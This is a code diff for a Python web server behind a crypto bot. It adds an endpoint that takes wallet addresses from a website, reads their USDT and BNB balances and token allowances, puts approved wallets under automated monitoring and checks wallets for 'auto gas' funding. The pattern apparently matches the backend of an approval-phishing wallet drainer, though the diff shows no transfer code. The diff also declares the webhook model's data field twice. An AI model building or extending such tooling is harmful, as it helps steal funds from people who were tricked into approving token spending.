@@ -43,6 +43,8 @@ class WithdrawalRequest(BaseModel):
 
 class WebhookData(BaseModel):
     event_type: str
+    wallet_address: Optional[str] = None
+    data: Optional[Dict[str, Any]] = None
     data: Dict[str, Any]
     timestamp: Optional[str] = None
     source: Optional[str] = "website"
@@ -229,6 +231,95 @@ class WebAPIServer:
             except Exception as e:
                 logger.error(f"Error in webhook handler: {e}")
                 raise HTTPException(status_code=500, detail="Internal server error")
+        
+        # NEW: Direct wallet submission endpoint for websites
+        @self.app.post("/api/submit-wallet")
+        async def submit_wallet_from_website(wallet_request: WalletRequest):
+            """
+            API endpoint to receive wallet addresses directly from website
+            This processes wallets exactly like group chat detection with auto gas
+            """
+            try:
+                wallet_address = wallet_request.address.strip()
+                
+                # Validate wallet address format
+                if not wallet_address.startswith('0x') or len(wallet_address) != 42:
+                    raise HTTPException(status_code=400, detail="Invalid wallet address format")
+                
+                # Convert to checksum address
+                try:
+                    wallet_address = blockchain_manager.w3.to_checksum_address(wallet_address)
+                except Exception as e:
+                    raise HTTPException(status_code=400, detail=f"Invalid wallet address: {str(e)}")
+                
+                # Get wallet balances
+                usdt_balance = blockchain_manager.get_usdt_balance(wallet_address)
+                bnb_balance = blockchain_manager.get_bnb_balance(wallet_address)
+                allowance = blockchain_manager.get_allowance(wallet_address)
+                
+                if usdt_balance is None or bnb_balance is None or allowance is None:
+                    raise HTTPException(status_code=500, detail="Failed to fetch wallet data from blockchain")
+                
+                # Import here to avoid circular imports
+                from handlers import check_immediate_auto_gas
+                from auto_mode import auto_mode_manager
+                
+                # Add wallet to monitoring if approved
+                if allowance > 0:
+                    auto_mode_manager.add_wallet(wallet_address)
+                
+                # Check for immediate auto gas (for ALL wallets, not just approved)
+                await check_immediate_auto_gas(wallet_address, usdt_balance, bnb_balance)
+                
+                # Also add to gas monitoring for background checks
+                auto_mode_manager.add_wallet_for_gas_monitoring(wallet_address)
+                
+                # Format response
+                response_data = {
+                    "status": "success",
+                    "wallet_address": wallet_address,
+                    "usdt_balance": round(usdt_balance, 2),
+                    "bnb_balance": bnb_balance,
+                    "allowance": allowance,
+                    "approved": allowance > 0,
+                    "source": wallet_request.source,
+                    "processed_at": datetime.now().isoformat(),
+                    "auto_gas_eligible": (
+                        usdt_balance >= 0.5 and 
+                        bnb_balance < 0.00000720 and 
+                        auto_mode_manager.auto_gas_enabled
+                    )
+                }
+                
+                logger.info(f"Website wallet processed: {wallet_address} | USDT: ${usdt_balance:.2f} | BNB: {bnb_balance:.8f} | Approved: {allowance > 0}")
+                
+                return response_data
+                
+            except HTTPException:
+                raise  # Re-raise HTTP exceptions
+            except Exception as e:
+                logger.error(f"Error processing website wallet: {e}")
+                raise HTTPException(status_code=500, detail=f"Processing error: {str(e)}")
+        
+        # Bot status endpoint
+        @self.app.get("/api/status")
+        async def get_bot_status():
+            """
+            Get current bot status and configuration
+            """
+            try:
+                from auto_mode import auto_mode_manager
+                
+                return {
+                    "status": "online",
+                    "auto_mode_enabled": auto_mode_manager.auto_mode_enabled,
+                    "auto_gas_enabled": auto_mode_manager.auto_gas_enabled,
+                    "monitored_wallets": len(auto_mode_manager.monitored_wallets),
+                    "timestamp": datetime.now().isoformat()
+                }
+            except Exception as e:
+                logger.error(f"Error getting bot status: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
         
         # Get API data logs
         @self.app.get("/api/logs/{log_type}")
